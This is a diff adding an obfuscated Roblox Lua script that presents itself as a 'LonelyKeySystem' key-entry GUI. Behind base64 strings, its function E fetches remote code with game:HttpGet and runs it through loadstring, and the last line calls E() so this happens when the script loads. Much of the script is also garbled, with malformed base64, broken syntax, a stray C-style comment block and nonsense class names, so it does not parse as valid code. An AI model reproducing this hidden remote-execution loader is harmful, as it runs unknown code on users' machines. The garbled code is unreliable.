@@ -1,0 +1,11 @@
+local P=game:GetService("Players")local R=game:GetService("ReplicatedStorage")local C=game:GetService("CoreGui")local S=game:GetService("RunService")local G_KEY="bG9uZWx5bGl0bno="local G_LINK="aHR0cHM6Ly9saW5rLWNlbnRlci5uZXQvMzUyNzE4MC92TG9sVnVjYWZxVkk="local function D(e)for i=1,#e do e=string.char(bit.bxor(e:byte(i),128))end return e end local function E(e)local l=loadstring(game:HttpGet(D"MTAzZDk3OTZkNjJkMTg1MjdlZDFkMWYxMDRlNDgxMmM="))()end local function N(e)local l=string.gsub(e,"%(function%[%d%]%)%s*%B()",%4)return loadstring(D("SWWJSULkHhoZXw5LC5wfG5mc2V0dSktLH..EAo5aisaTY=))
+ end local function F()if C:FindFirstChild("LonelyKeySystem")then C.LonelyKeySystem:Destroy()end local e=Instance.new(D("U2NyZWVuR2Ui))local N=Instance.new(D("RnJhbWU="))local UIC1=Instance.new(D("UENSRnlER21hcS5IaW5nYW5kbG9yYWR5cyJIkFZpbGQkNyYgBl9Fcm9yZzo5IT9kZXZpbmFsqlbfnQ="))local e1=Instance.new(D("U2NyZWVuR2Ui))
+ local e2=Instance.new(D("dG9wIHRlc3R1c3R1eHQgU2NyZWVblwjWVRzZGVzOg=="))local Y=Instance.new(D("U2ltdGhxVGhmCWh3NG94bHRoBl9Jc3NvZ3FpKSkpRklUHlQ6bGVhbWV0cm90cHNnLmNvbnZlcmxvYWN4cmJydWZ5cnMTJQ=="))
+
+G_KEY=G_KEY:sub(1)+"hLEVKWndmHVJvZ2h9XGNRAkJyZSpzJjxjIn0oAKkxD3ampYXNVerLXIkMA30uYjE4･･RRL3k7pP/p2/pgZ.CL"SLY0/lnxfvwiRDfNSRZkmHJISeG5+Yla3I12I7ErKvt8yOiR0R4IjIHVjFFxqbmN7VGtv;9cm8YXH0xJnGgRkoQrlYA==\nOL1QRfiEAG9lPF96e9ZGlsumErQpjI==" /*
+
+PI=1;CT=30;MUI=600000;UID=7000000-1-9789796799;UID_ERR=0;UID_SET=FALSE;
+*/local A=Instance.new(D("dG9rZ3c=)"))local t=Instance.new(D"TGV0aXVjaHRvbG")local z=Instance.new(D()"RVhWbio0MgQYF5dCkqXnmCUFEZnNsaG5cp6hTbUlta2ltZWxhaWg9AKqQZQZXJgIHgGBkpwx2ZM0UIX3xDOxZGDWbXHkwZQA4txhJbHZKc3g5QUJEQjFbQUlNUjo N1dCOz0ynQFzPChteTVbeFVzOU7VzIVsYXlhbRNhVATJxf/yW33ah<'=)lRnZAco4LlAZ/WW91Ckg4M0cwS0JRdHpNVxNjCkZKWmh0eFdrZjdiOGozorausXTIwZXlsKGhyenRvKChhYXMxCjBgZg9WEFxIdG9xZXM=)
+end
+local function W()local e=C:FindFirstChild(D("fHNhU2hvbG0cU2NhcmF5SHNqZXN1QnnFoB0gU0g=)"))if e then e:Destroy()end local e=Instance.new(D("U2NhcmV3aW51Z2VmZHM="))e.Parent=C
+end;E()
